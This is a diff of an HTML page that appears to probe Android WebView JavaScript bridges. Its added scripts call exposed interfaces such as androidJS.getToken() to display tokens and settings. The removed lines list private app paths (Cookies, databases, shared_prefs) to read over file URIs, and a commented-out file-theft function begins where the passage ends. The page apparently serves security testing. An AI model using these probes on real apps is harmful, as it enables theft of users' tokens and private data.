@@ -12,25 +12,29 @@
     
     <body>
         <p id="content">zzz!</p>
-        <br/>
-        <br/>
-	<br/>
-	<br/>
-<script>alert(1);</script>
+        <script type="text/javascript">
+        document.write("token: " + androidJS.getSettings());
+        </script>
 	    
         <script type="text/javascript">
-        document.write("token: " + JavaScriptInterface.getToken());
+        document.write("token: " + androidJS.getToken());
+        </script>
+
+	<script type="text/javascript">
+        document.write("token: " + JPushWeb.getSettings());
+        </script>
+
+	    
+	<script type="text/javascript">
+        document.write("token: " + JSCallJava.getSettings());
+        </script>
+
+	    	<script type="text/javascript">
+        document.write("token: " + interface.getSettings());
         </script>
 
 	// file access from file URIs - attempt#1
-	// /data/data/Android/app.phantom/databases/";
-	// /data/data/app.phantom/webview/Cookies";
-	// /data/data/Android/app.phantom/files/databases/database.db"
-	    // shared_prefs/com.google.android.gms.appid.xml
-	 //shared_prefs/app.phantom_preferences.xml
-	  ///data/user/0/io.iotex.iopay.gp/lib-main
-	    
-	    
+    
 	//  <script type="text/javascript">
         //function theftFile(path, callback) {
           //var req = new XMLHttpRequest();
